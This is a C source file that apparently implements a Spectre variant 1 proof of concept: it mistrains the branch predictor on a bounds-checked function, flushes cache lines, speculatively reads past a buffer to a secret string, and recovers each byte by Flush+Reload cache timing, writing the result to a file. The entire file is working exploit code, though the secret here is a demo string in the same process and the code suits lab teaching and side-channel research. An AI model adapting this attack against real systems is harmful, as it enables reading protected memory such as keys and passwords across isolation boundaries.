#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>

unsigned int bound_lower = 0;
unsigned int bound_upper = 9;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9}; 
uint8_t temp    = 0;
char    *secret = "Some Secret Value";   
uint8_t array[256*4096];

#define CACHE_HIT_THRESHOLD (130)
#define DELTA 1024
#define MAX_ITERATIONS 30

// Sandbox Function
uint8_t restrictedAccess(size_t x){
	if (x <= bound_upper && x >= bound_lower) {
		return buffer[x];
	} else {
		return 0;
	}
}

void flushSideChannel(){
	int i;
	// Write to array to bring it to RAM to prevent Copy-on-write
	for (i = 0; i < 256; i++)
		array[i*4096 + DELTA] = 1;
	//flush the values of the array from cache
	for (i = 0; i < 256; i++) 
		_mm_clflush(&array[i*4096 + DELTA]);
}

static int scores[256];

void reloadSideChannelImproved(){
	int i;
	volatile uint8_t *addr;
	register uint64_t time1, time2;
	int junk = 0;
	for (i = 0; i < 256; i++) {
		addr = &array[i * 4096 + DELTA];
		time1 = __rdtscp(&junk);
		junk = *addr;
		time2 = __rdtscp(&junk) - time1;
		if (time2 <= CACHE_HIT_THRESHOLD)
			scores[i]++; /* if cache hit, add 1 for this value */
	} 
}

void spectreAttack(size_t index_beyond){
	int i;
	uint8_t s;
	volatile int z;

	for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }

	// Train the CPU to take the true branch inside victim().
	for (i = 0; i < 10; i++) {
		restrictedAccess(i);  
	}

	// Flush bound_upper, bound_lower, and array[] from the cache.
	_mm_clflush(&bound_upper);
	_mm_clflush(&bound_lower); 
	for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
	for (z = 0; z < 100; z++)  {  }
	//
	// Ask victim() to return the secret in out-of-order execution.
	s = restrictedAccess(index_beyond);
	array[s*4096 + DELTA] += 88;
}

char bruteForce(size_t index){
    int i;

    flushSideChannel();
    for(i=0;i<256; i++) scores[i]=0; 

    for (i = 0; i < 1000; i++) {
        //printf("*****\n");  // This seemly "useless" line is necessary for the attack to succeed
        spectreAttack(index);
        usleep(10);
        reloadSideChannelImproved();
    }

    int max = 1;
    for (i = 1; i < 256; i++){ // Get the point with most hits
        if(scores[max] < scores[i]) 
			max = i;
    }

    return max;
}

int main() {
	int i = 0;
	uint8_t s;
	size_t index_beyond = (size_t)(secret - (char*)buffer);

	FILE *f = fopen("result.txt", "w");

	char character = 'A'; size_t index = index_beyond;

	while((character != '\0') && ((i++) < MAX_ITERATIONS)){
	//for(i = 0; i < 10; i++){
		character = bruteForce(index);
		putchar(character);
		putc(character, f);
		index += sizeof(char);

		usleep(10);
	}
	putc('\n', f); fclose(f);

	return 0; 
}
